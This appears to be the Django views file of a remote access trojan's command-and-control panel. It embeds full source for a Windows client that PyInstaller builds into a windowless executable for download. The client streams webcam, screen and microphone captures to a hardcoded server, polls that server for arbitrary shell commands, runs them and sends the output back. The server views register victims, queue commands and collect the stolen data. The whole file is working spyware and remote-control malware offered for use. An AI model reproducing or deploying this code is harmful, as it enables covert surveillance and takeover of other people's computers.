import os
import time
import subprocess
import shutil
import uuid
import logging
import psutil
from django.conf import settings
from django.http import FileResponse
from django.shortcuts import render
from django.utils import timezone
from django.contrib.auth.decorators import login_required
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import Client
from .serializers import ClientSerializer
from datetime import timedelta

logger = logging.getLogger(__name__)

@login_required
def index(request):
    clients = Client.objects.all()
    online_count = clients.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count()
    offline_count = clients.count() - online_count
    return render(request, 'index.html', {
        'clients': clients,
        'online_count': online_count,
        'offline_count': offline_count
    })

@login_required
def cmd_page(request, client_id):
    try:
        client = Client.objects.get(client_id=client_id)
        return render(request, 'cmd.html', {'client': client})
    except Client.DoesNotExist:
        logger.error(f"Client with ID {client_id} not found")
        return render(request, 'cmd.html', {'error': 'کلاینت یافت نشد'})

@login_required
def generate_exe(request):
    try:
        folder_path = os.path.join(settings.BASE_DIR, 'APP_WEB_HACK')
        os.makedirs(folder_path, exist_ok=True)

        client_code = """
import os
import getpass
import requests
import json
import uuid
import subprocess
import time
import logging
import re
import cv2
import numpy as np
import base64
import pyaudio
import wave
import pyautogui

logging.basicConfig(level=logging.INFO, filename='client.log', filemode='a',
                    format='%(asctime)s - %(levelname)s - %(message)s', encoding='utf-8')
logger = logging.getLogger(__name__)

SERVER_URL = "https://amirmmahdi.pythonanywhere.com//api/"
CLIENT_ID = getpass.getuser()
TOKEN = str(uuid.uuid4())
CURRENT_DIR = os.getcwd()
STREAMING = False
STREAM_TYPE = None

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logger.error("Webcam not available")
            return "Error: Webcam not available"
        ret, frame = cap.read()
        if ret:
            frame = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            jpg_as_text = base64.b64encode(buffer).decode('ascii')
            cap.release()
            return jpg_as_text
        cap.release()
        logger.error("No frame captured")
        return "Error: No frame captured"
    except Exception as e:
        logger.error(f"Error capturing webcam: {str(e)}")
        return f"Error capturing webcam: {str(e)}"

def capture_screen():
    try:
        pyautogui.FAILSAFE = False
        screenshot = pyautogui.screenshot()
        img = np.array(screenshot.rgb)
        img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
        img = cv2.resize(img, (960, 540))
        _, buffer = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
        jpg_as_text = base64.b64encode(buffer).decode('ascii')
        logger.info("Screen captured successfully")
        return jpg_as_text
    except Exception as e:
        logger.error(f"Error capturing screen: {str(e)}")
        return f"Error capturing screen: {str(e)}"

def record_audio(seconds=1):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 22050
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open('temp_audio.wav', 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        with open('temp_audio.wav', 'rb') as f:
            audio_data = base64.b64encode(f.read()).decode('ascii')
        logger.info("Audio recorded successfully")
        return audio_data
    except Exception as e:
        logger.error(f"Error recording audio: {str(e)}")
        return f"Error recording audio: {str(e)}"

def stream_data(type):
    global STREAMING, STREAM_TYPE
    STREAMING = True
    STREAM_TYPE = type
    logger.info(f"Starting stream: {type}")
    while STREAMING:
        try:
            if type == 'webcam':
                data = capture_webcam()
            elif type == 'weblive':
                data = capture_screen()
            elif type == 'webmicrophone':
                data = record_audio()
            else:
                logger.error(f"Invalid stream type: {type}")
                break
            if not data.startswith('Error'):
                response = requests.post(f"{SERVER_URL}stream/{CLIENT_ID}/{type}/",
                                        json={'data': data}, timeout=5)
                response.raise_for_status()
                logger.info(f"Stream data sent for {type}")
            else:
                logger.error(f"Stream data error: {data}")
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"Stream error for {type}: {str(e)}")
            time.sleep(1)
    logger.info(f"Stopped stream: {type}")

def register_client():
    try:
        response = requests.post(f"{SERVER_URL}register/",
                                json={'client_id': CLIENT_ID, 'token': TOKEN}, timeout=5)
        response.raise_for_status()
        logger.info(f"Registered: {response.json()}")
    except Exception as e:
        logger.error(f"Registration failed: {str(e)}")

def poll_server():
    global STREAMING, STREAM_TYPE
    last_command_id = None
    while True:
        try:
            response = requests.get(f"{SERVER_URL}poll/{CLIENT_ID}/", timeout=5)
            response.raise_for_status()
            data = response.json()
            command = data.get('last_command')
            command_id = data.get('command_id')
            if command and command_id and command_id != last_command_id:
                logger.info(f"Received command: {command} (ID: {command_id})")
                output = ""
                command_lower = command.strip().lower()
                if command_lower in ['webcam', 'weblive', 'webmicrophone']:
                    if STREAMING:
                        STREAMING = False
                        time.sleep(0.1)
                    import threading
                    threading.Thread(target=stream_data, args=(command_lower,), daemon=True).start()
                    output = f"Started streaming {command_lower}"
                elif command_lower == 'stopstream':
                    STREAMING = False
                    STREAM_TYPE = None
                    output = "Streaming stopped"
                elif re.match(r'^([a-zA-Z]):$', command.strip()):
                    drive = command.strip()
                    try:
                        os.chdir(drive + '\\\\')
                        CURRENT_DIR = os.getcwd()
                        output = f"Changed drive to {drive}"
                    except Exception as e:
                        output = f"Error changing drive: {e}"
                elif command_lower.startswith('cd '):
                    new_dir = command[3:].strip()
                    try:
                        os.chdir(new_dir)
                        CURRENT_DIR = os.getcwd()
                        output = f"Changed directory to {CURRENT_DIR}"
                    except Exception as e:
                        output = f"Error changing directory: {e}"
                else:
                    try:
                        if command_lower.endswith('.exe'):
                            command = f'"{os.path.join(CURRENT_DIR, command.strip())}"'
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            encoding='utf-8',
                            cwd=CURRENT_DIR
                        )
                        output = result.stdout + result.stderr
                        if result.returncode != 0:
                            output += f"\\nError: Command failed with exit code {result.returncode}"
                    except Exception as e:
                        output = f"Error executing command: {e}"
                response = requests.post(
                    f"{SERVER_URL}poll/{CLIENT_ID}/",
                    json={'output': output}, timeout=5
                )
                response.raise_for_status()
                logger.info(f"Sent output: {output[:100]}...")
                last_command_id = command_id
        except Exception as e:
            logger.error(f"Poll failed: {e}")
        time.sleep(1)

if __name__ == "__main__":
    time.sleep(1)
    register_client()
    poll_server()
"""
        client_path = os.path.join(folder_path, 'client.py')
        with open(client_path, 'w', encoding='utf-8') as f:
            f.write(client_code)

        exe_path = os.path.join(folder_path, 'client.exe')
        icon_path = os.path.join(settings.BASE_DIR, 'icon.ico')

        # Check if client.exe is running and terminate it
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'client.exe':
                proc.terminate()
                proc.wait(timeout=5)
                logger.info("Terminated existing client.exe process")

        # Remove existing client.exe
        if os.path.exists(exe_path):
            for _ in range(5):
                try:
                    os.chmod(exe_path, 0o666)
                    os.remove(exe_path)
                    break
                except PermissionError:
                    time.sleep(2)
            else:
                raise PermissionError("نمی‌توان فایل client.exe را حذف کرد، احتمالاً در حال اجرا است.")

        # Build new client.exe
        for attempt in range(3):
            try:
                pyinstaller_cmd = [
                    'pyinstaller', '--onefile', '--noconsole', '--distpath', folder_path, '--specpath', folder_path
                ]
                if os.path.exists(icon_path):
                    pyinstaller_cmd.append(f'--icon={icon_path}')
                pyinstaller_cmd.append(client_path)
                subprocess.run(pyinstaller_cmd, check=True, timeout=300)
                break
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
                if attempt < 2:
                    time.sleep(5)
                    continue
                raise Exception(f"خطا در ساخت فایل client.exe: {str(e)}")

        # Clean up
        shutil.rmtree(os.path.join(folder_path, 'build'), ignore_errors=True)
        spec_path = os.path.join(folder_path, 'client.spec')
        if os.path.exists(spec_path):
            os.remove(spec_path)
        if os.path.exists(client_path):
            os.remove(client_path)

        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': 'فایل client.exe با موفقیت در پوشه APP_WEB_HACK ساخته شد!'
        })
    except Exception as e:
        logger.error(f"خطا در ساخت فایل: {str(e)}")
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': f'خطا در ساخت exe: {str(e)}'
        })

@login_required
def download_exe(request):
    exe_path = os.path.join(settings.BASE_DIR, 'APP_WEB_HACK', 'client.exe')
    if os.path.exists(exe_path):
        return FileResponse(open(exe_path, 'rb'), as_attachment=True, filename='client.exe')
    else:
        logger.error("client.exe not found")
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': 'خطا: فایل client.exe یافت نشد. لطفاً ابتدا فایل را بسازید.'
        })

class ClientRegisterView(APIView):
    def post(self, request):
        client_id = request.data.get('client_id')
        token = request.data.get('token')
        if not client_id or not token:
            logger.error("Missing client_id or token")
            return Response({'error': 'client_id and token required'}, status=status.HTTP_400_BAD_REQUEST)
        client, created = Client.objects.get_or_create(
            client_id=client_id,
            defaults={'token': token, 'last_seen': timezone.now()}
        )
        client.last_seen = timezone.now()
        client.save()
        serializer = ClientSerializer(client)
        logger.info(f"Client {client_id} {'registered' if created else 'updated'}")
        return Response(serializer.data, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)

class ClientCommandView(APIView):
    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            command = request.data.get('command')
            if not command:
                logger.error(f"No command provided for client {client_id}")
                return Response({'error': 'command required'}, status=status.HTTP_400_BAD_REQUEST)
            client.last_command = command
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()
            output = client.last_output or ''
            if command.lower() in ['webcam', 'weblive', 'webmicrophone']:
                output = 'Stream started'
            return Response({
                'status': 'command sent',
                'command_id': str(client.command_id),
                'output': output
            }, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientPollView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            client.last_seen = timezone.now()
            client.save()
            serializer = ClientSerializer(client)
            logger.info(f"Poll request from {client_id}")
            return Response(serializer.data, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            output = request.data.get('output')
            if output:
                client.last_output = output
                client.last_command = None
                client.command_id = None
                client.last_seen = timezone.now()
                client.save()
                logger.info(f"Output received from {client_id}: {output[:100]}...")
            return Response({'status': 'output received'}, status=status.HTTP_202_ACCEPTED)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class StreamView(APIView):
    def post(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = request.data.get('data')
            if data:
                client.last_output = data
                client.last_seen = timezone.now()
                client.save()
                logger.info(f"Stream data received from {client_id} for {stream_type}")
            return Response({'status': 'data received'}, status=status.HTTP_202_ACCEPTED)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def get(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = client.last_output
            if data and not data.startswith('Error'):
                return Response({'data': data}, status=status.HTTP_200_OK)
            else:
                logger.warning(f"No valid stream data for {client_id} ({stream_type})")
                return Response({'data': data or 'No data available'}, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)